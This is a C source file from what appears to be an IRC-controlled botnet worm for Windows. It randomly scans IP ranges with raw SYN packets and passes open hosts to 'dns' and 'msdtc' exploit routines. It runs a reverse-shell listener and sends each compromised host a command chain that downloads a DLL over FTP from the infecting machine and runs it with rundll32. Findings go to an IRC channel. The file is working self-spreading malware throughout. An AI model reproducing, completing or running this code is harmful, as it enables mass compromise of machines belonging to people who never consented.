
#include "include.h" 
#include "extern.h" 

unsigned short s_port; 
unsigned short x_port; 
extern unsigned short ftp_port; 

unsigned long scan_getnextip(const char *scanmask) 
/* get a random ip for scanning */ 
{ 
   int a = -1; 
   int b = -1; 
   int c = -1; 
   int d = -1; 
   char ip[16]; 
   sscanf(scanmask, "%d.%d.%d.%d", &a, &b, &c, &d); 
   if(a == -1) 
      a = rrand(0, 255); 
   if(b == -1) 
      b = rrand(0, 255); 
   if(c == -1) 
      c = rrand(0, 255); 
   if(d == -1) 
      d = rrand(0, 255); 
   _snprintf(ip, sizeof(ip), "%d.%d.%d.%d", a, b, c, d); 
   if(!strcmp(ip, local_ip) || !strcmp(ip, global_ip)) 
      return scan_getnextip(scanmask); 
   return inet_addr(ip); 
} 

bool scan_checkservers() 
/* make sure all servers are up and running */ 
{ 
   if(!numthread("ftpd")) 
   { 
      char pbuf[8]; 
      struct ftpds ftpd; 
      ftpd.port = rrand(2000, 60000); 
      ftpd.gotinfo = false; 
      if((ftpd.tnum = addthread("ftpd", itoa(ftpd.port, pbuf, 10))) == -1) 
         return false; 
      if(!(thread[ftpd.tnum].handle = makethread(ftp_start, &ftpd))) 
         return false; 
      while(!ftpd.gotinfo) 
         Sleep(10); 
   } 
   return true; 
} 

bool shell_connect(unsigned long ip, unsigned short port) 
/* connect to shell */ 
{ 
   char recvbuf[4096]; 
   char cmdbuf[1024]; 
   char file[16]; 
   struct sockaddr_in sin; 
   SOCKET sock; 
   if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
      return false; 
   sin.sin_family = AF_INET; 
   sin.sin_port = htons(port); 
   sin.sin_addr.s_addr = ip; 
   memset(sin.sin_zero, 0, 8); 
   if(connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1) 
   { 
      closesocket(sock); 
      return false; 
   } 
   if(recv(sock, recvbuf, sizeof(recvbuf), 0) <= 0) 
   { 
      closesocket(sock); 
      return false; 
   } 
   _snprintf(file, sizeof(file), "%s.dll", irc_rndnick()); 
   _snprintf(cmdbuf, sizeof(cmdbuf), 
      "echo open %s %hu>x" 
      "&echo user x x>>x" 
      "&echo bin>>x" 
      "&echo get %s>>x" 
      "&echo bye>>x" 
      "&ftp.exe -n -s:x" 
      "&del x" 
      "&rundll32.exe %s,start\r\n", 
      local_ip, ftp_port, file, file); 
   send(sock, cmdbuf, strlen(cmdbuf), 0); 
   closesocket(sock); 
   return true; 
} 

void scan_portopen(unsigned long ip, unsigned short port) 
/* send SYN packet to ip */ 
{ 
   int flag = 1; 
   int sin_len = sizeof(struct sockaddr); 
   unsigned long src_ip = inet_addr(local_ip); 
   struct sockaddr_in sin; 
   struct tcpp p; 
   SOCKET sock; 
   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1) 
      return; 
   if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == -1) 
      return; 
   sin.sin_family = AF_INET; 
   sin.sin_port = 0; 
   sin.sin_addr.s_addr = ip; 
   memset(sin.sin_zero, 0, 8); 
   makesyn(&p, src_ip, ip, s_port, port); 
   sendto(sock, (char *)&p, sizeof(p), 0, (struct sockaddr *)&sin, sizeof(sin)); 
   closesocket(sock); 
} 

unsigned int __stdcall scan_start(void *param) 
/* main scan function (scans an ip range for open ports or vulnerabilities) */ 
{ 
   unsigned short port; 
   struct scans scan = *(struct scans *)param; 
   struct scans *pscan = (struct scans *)param; 
   HANDLE th; 
   pscan->gotinfo = true; 
   srand(GetTickCount()); 
   port = scan.port; 
   if(scan.exploit[0]) 
   { 
      if(!scan_checkservers()) 
      { 
         clearthread(scan.tnum); 
         _endthreadex(0); 
      } 
      if(!strcmp("msdtc", scan.exploit)) 
      { 
         if(!numthread("rshell")) 
         { 
            char pbuf[8]; 
            struct rshells rshell; 
            x_port = rrand(2000, 60000); 
            rshell.gotinfo = false; 
            if((rshell.tnum = addthread("rshell", itoa(x_port, pbuf, 10))) == -1) 
            { 
               clearthread(rshell.tnum); 
               _endthreadex(0); 
            } 
            if(!(thread[rshell.tnum].handle = makethread(rshell_start, &rshell))) 
            { 
               clearthread(rshell.tnum); 
               _endthreadex(0); 
            } 
            while(!rshell.gotinfo) 
               Sleep(10); 
         } 
      } 
   } 
   s_port = rrand(2000, 60000); 
   scan.lgotinfo = false; 
   if(!(th = makethread(scan_listen, &scan))) 
      _endthreadex(0); 
   CloseHandle(th); 
   while(!scan.lgotinfo) 
      Sleep(10); 
   while(1) 
   { 
      if(scan.port2) 
      { 
         int r; 
         if(scan.port3) 
            r = rrand(0, 2); 
         else 
            r = rrand(0, 2); 
         switch(r) 
         { 
            case 0: 
               port = scan.port; 
               break; 
            case 1: 
               port = scan.port2; 
               break; 
            case 2: 
               port = scan.port3; 
               break; 
            default: 
               break; 
         } 
      } 
      scan_portopen(scan_getnextip(scan.mask), port); 
      Sleep(scan.delay); 
   } 
   clearthread(scan.tnum); 
   _endthreadex(0); 
   return 0; 
} 

unsigned int __stdcall scan_listen(void *param) 
/* listen for raw packets and process them */ 
{ 
   char buf[65535]; 
   unsigned long mode = 1; 
   struct sockaddr_in sin; 
   struct in_addr in; 
   struct ip_hdr *iph; 
   struct tcp_hdr *tcph; 
   struct scans scan = *(struct scans *)param; 
   struct scans *pscan = (struct scans *)param; 
   SOCKET sock; 
   HANDLE th; 
   pscan->lgotinfo = true; 
   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1) 
      _endthreadex(0); 
   sin.sin_family = AF_INET; 
   sin.sin_port = 0; 
   sin.sin_addr.s_addr = inet_addr(local_ip); 
   memset(sin.sin_zero, 0, 8); 
   if(bind(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1) 
   { 
      closesocket(sock); 
      _endthreadex(0); 
   } 
   if(ioctlsocket(sock, SIO_RCVALL, &mode) == -1) 
   { 
      closesocket(sock); 
      _endthreadex(0); 
   } 
   while(scan_active) 
   { 
      if(recv(sock, buf, sizeof(buf), 0) <= 0) 
      { 
         closesocket(sock); 
         _endthreadex(0); 
      } 
      iph = (struct ip_hdr *)buf; 
      if(iph->ip_p != IPPROTO_TCP) 
         continue; 
      tcph = (struct tcp_hdr *)(buf + sizeof(struct ip_hdr)); 
      if(tcph->th_flags == (SYN | ACK)) 
      { 
         if(ntohs(tcph->th_dport) == s_port) 
         { 
            if(ntohs(tcph->th_sport) == scan.port || ntohs(tcph->th_sport) == scan.port2 || ntohs(tcph->th_sport) == scan.port3) 
            { 
               in.s_addr = iph->ip_src; 
               if(scan.exploit[0]) 
               { 
                  struct exploits exploit; 
                  exploit.ip = iph->ip_src; 
                  exploit.port = ntohs(tcph->th_sport); 
                  exploit.gotinfo = false; 
                  if(!strcmp(scan.exploit, "dns")) 
                  { 
                     if(!(th = makethread(dns_exploit, &exploit))) 
                        continue; 
                     CloseHandle(th); 
                  } 
                  while(!exploit.gotinfo) 
                     Sleep(10); 
               } 
               else 
                  irc_privmsg(scanchan, "port %hu open on %s", ntohs(tcph->th_sport), inet_ntoa(in)); 
            } 
         } 
      } 
   } 
   closesocket(sock); 
   _endthreadex(0); 
   return 0; 
} 

unsigned int __stdcall rshell_start(void *param) 
/* reverse shell listener */ 
{ 
   int csin_size = sizeof(struct sockaddr); 
   char cmdbuf[1024]; 
   char file[16]; 
   struct sockaddr_in sin; 
   struct sockaddr_in csin; 
   struct in_addr in; 
   struct rshells rshell = *(struct rshells *)param; 
   struct rshells *prshell = (struct rshells *)param; 
   SOCKET lsock; 
   SOCKET csock; 
   prshell->gotinfo = true; 
   if((lsock = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
   { 
      clearthread(rshell.tnum); 
      _endthreadex(0); 
   } 
   sin.sin_family = AF_INET; 
   sin.sin_port = htons(x_port); 
   sin.sin_addr.s_addr = INADDR_ANY; 
   memset(sin.sin_zero, 0, 8); 
   while(bind(lsock, (struct sockaddr *)&sin, sizeof(sin)) == -1) 
      Sleep(5000); 
   listen(lsock, 10); 
   while(1) 
   { 
      if((csock = accept(lsock, (struct sockaddr *)&csin, &csin_size)) == -1) 
         continue; 
      in.s_addr = csin.sin_addr.s_addr; 
      irc_privmsg(scanchan, "[+] Got reverse shell connection from %s", inet_ntoa(in)); 
      _snprintf(file, sizeof(file), "%s.dll", irc_rndnick()); 
      _snprintf(cmdbuf, sizeof(cmdbuf), 
         "echo open %s %hu>x" 
         "&echo user x x>>x" 
         "&echo bin>>x" 
         "&echo get %s>>x" 
         "&echo bye>>x" 
         "&ftp.exe -n -s:x" 
         "&del x" 
         "&rundll32.exe %s,start\r\n", 
         local_ip, ftp_port, file, file); 
      send(csock, cmdbuf, strlen(cmdbuf), 0); 
      closesocket(csock); 
   } 
} 
